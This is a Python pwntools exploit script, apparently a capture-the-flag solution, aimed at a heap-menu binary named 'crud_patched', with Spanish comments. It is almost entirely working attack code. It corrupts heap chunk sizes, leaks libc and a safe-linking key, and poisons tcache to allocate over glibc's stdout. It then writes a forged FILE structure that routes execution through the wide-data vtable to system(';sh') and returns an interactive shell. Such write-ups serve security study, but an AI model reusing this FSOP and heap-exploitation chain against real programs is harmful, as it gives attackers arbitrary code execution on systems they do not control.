from pwn import *

context.arch = "amd64"

def new(idx, size, data):
    io.sendlineafter(">> ", b"1")
    io.recvuntil("index:\n")
    io.sendline(str(idx).encode())
    io.recvuntil("size:\n")
    io.sendline(str(size).encode())
    io.recvuntil("data:\n")
    io.send(data)

def show(idx):
    io.sendlineafter(">> ", b"2")
    io.sendline(str(idx).encode())
    io.recvuntil("index:\n")
    return io.recvline().strip()

def edit(idx, data):
    io.sendlineafter(">> ", b"3")
    io.recvuntil("index:\n")
    io.sendline(str(idx).encode())
    io.recvuntil("data:\n")
    io.send(data)

def FSOP_struct(
    flags=0,
    _IO_read_ptr=0,
    _IO_read_end=0,
    _IO_read_base=0,
    _IO_write_base=0,
    _IO_write_ptr=0,
    _IO_write_end=0,
    _IO_buf_base=0,
    _IO_buf_end=0,
    _IO_save_base=0,
    _IO_backup_base=0,
    _IO_save_end=0,
    _markers=0,
    _chain=0,
    _fileno=0,
    _flags2=0,
    _old_offset=0,
    _cur_column=0,
    _vtable_offset=0,
    _shortbuf=0,
    lock=0,
    _offset=0,
    _codecvt=0,
    _wide_data=0,
    _freeres_list=0,
    _freeres_buf=0,
    __pad5=0,
    _mode=0,
    _unused2=b"",
    vtable=0,
    more_append=b""
):
    FSOP = p64(flags)
    FSOP += p64(_IO_read_ptr)
    FSOP += p64(_IO_read_end)
    FSOP += p64(_IO_read_base)
    FSOP += p64(_IO_write_base)
    FSOP += p64(_IO_write_ptr)
    FSOP += p64(_IO_write_end)
    FSOP += p64(_IO_buf_base)
    FSOP += p64(_IO_buf_end)
    FSOP += p64(_IO_save_base)
    FSOP += p64(_IO_backup_base)
    FSOP += p64(_IO_save_end)
    FSOP += p64(_markers)
    FSOP += p64(_chain)
    FSOP += p32(_fileno)
    FSOP += p32(_flags2)
    FSOP += p64(_old_offset)
    FSOP += p16(_cur_column)
    FSOP += p8(_vtable_offset)
    FSOP += p8(_shortbuf)
    FSOP += p32(0)
    FSOP += p64(lock)
    FSOP += p64(_offset)
    FSOP += p64(_codecvt)
    FSOP += p64(_wide_data)
    FSOP += p64(_freeres_list)
    FSOP += p64(_freeres_buf)
    FSOP += p64(__pad5)
    FSOP += p32(_mode)

    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def decrypt_ptr(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

libc = ELF("./libc.so.6")

io = process("./crud_patched")

#io = remote("0.cloud.chals.io", 22624)

new(0, 0x18, b"A"*0x18)
edit(0, b"A"*0x18 + p64(0xd51))

new(1, 0xd48, b"B")

edit(0, cyclic(0x20))

libc_leak = u64(show(0)[0x20:].ljust(8, b"\x00"))

print(hex(libc_leak))

libc.address = libc_leak - 0x203b20

# retornar al estado original del chunk

edit(0, b"A"*0x18 + p64(0xd31))

# Este pasa a usar el unsorted liberado
new(2, 0xd18, b"C")

edit(1, b"B"*0xd48 + p64(0x2b1)) # esto para liberar el nuevo "heap"

new(3, 0x2a8, b"D")
# Liberación exitosa!
# Pero, ahora necesitamos 2 aun count esta en 1
# Repetimos una vez mas 

new(4, 0xa98, b"E")

edit(4, b"E"*0xa98 + p64(0x2b1))

# otro chunk para tcache
new(5, 0x2a8, b"F")

edit(4, cyclic(0xa98 + 0x8))

# Listo tcachebins con dos chunks 
encrypted_ptr = u64(show(4)[2720:].ljust(8, b"\x00"))

print(hex(encrypted_ptr))

dec = decrypt_ptr(encrypted_ptr)
dec &= ~0xfff
dec += 0xd60

key = encrypted_ptr ^ dec

#heap_base = leak_heap - 0x21d4e

#print(hex(leak_heap))
#print(hex(heap_base))
# hay que retornar al estado normal

edit(4, cyclic(0xa98) + p64(0x291))

edit(4, cyclic(0xa98) + p64(0x291) + p64(libc.sym._IO_2_1_stdout_ ^ key))
# Esto ya es un hecho con esto hacemos magia:
# 0x290 [  2]: 0x562a9b6edd60 ◂— 0x6262626700cbd48f
# Ahora si

new(6, 0x288, b"6")

input("PAUSE")
new(7, 0x288, b"7")

stdout_lock = libc.sym.__nptl_last_event - 0x48

FSOP = FSOP_struct(
    flags = u64(b"\x01\x01\x01\x01;sh\x00"),
    lock=stdout_lock,
    _unused2=b"\x00"*12 + p64(libc.sym._IO_2_1_stdout_ - 8), #libc.sym._IO_2_1_stdout_ - 8),
    _markers=libc.sym.system,
    _wide_data=libc.sym._IO_2_1_stdout_ - 0x10,
    vtable=libc.sym._IO_wfile_jumps - 0x20,
    #_mode=0xFFFFFFFF
)

edit(7, bytes(FSOP))

io.interactive()
